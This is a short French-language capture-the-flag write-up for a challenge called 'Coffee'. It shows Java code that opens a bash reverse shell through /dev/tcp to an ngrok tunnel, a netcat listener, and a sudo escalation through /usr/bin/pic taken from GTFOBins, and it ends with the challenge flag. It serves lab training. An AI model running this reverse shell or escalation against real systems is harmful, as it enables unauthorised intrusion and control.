# Solve - Coffee

## Remote Code Execution
Reverse shell en java via ngrok
```bash
# Dans un terminal
nc -lvnp 1234
# Dans un autre terminal
ngrok tcp 1234
```

On execute ce code dans l'appli
```java
// String command = "sh -i >& /dev/tcp/ATTAQUANT.com/PORT 0>&1";
// Adaptez la ligne du dessus à vos besoin, la mienne ressemble à ça avec les valeurs donnees par ngrok
String command = "sh -i >& /dev/tcp/4.tcp.eu.ngrok.io/13328 0>&1";  

try {
ProcessBuilder processBuilder = new ProcessBuilder("/bin/bash", "-c", command);
Process process = processBuilder.start();

java.io.InputStream is = process.getInputStream();
java.util.Scanner scanner = new java.util.Scanner(is).useDelimiter("\\A");
String result = scanner.hasNext() ? scanner.next() : "";

System.out.println(result);

process.waitFor();
} catch (IOException | InterruptedException e) {
e.printStackTrace();
}
```

## Privilege escalation

En tapant `sudo -l` on remarque qu'on peut executer la commande `/usr/bin/pic` en tant que l'utilisateur merciol. Notre objectif c'est de devenir merciol "notre objectif à tous dites pas le contraire".  
En se rendant sur https://gtfobins.github.io/gtfobins/ on voit qu'on peut s'en servir pour escalader les privilèges.
```bash
sudo -u merciol /usr/bin/pic -U
.PS
sh X sh X
```
```bash
whoami
merciol
```
On est maintenant merciol, 
```bash
cat /home/merciol/flag.txt
```

### Flag IUT{N4N_M415_J4V4_C357_C00L_3N_VR41}
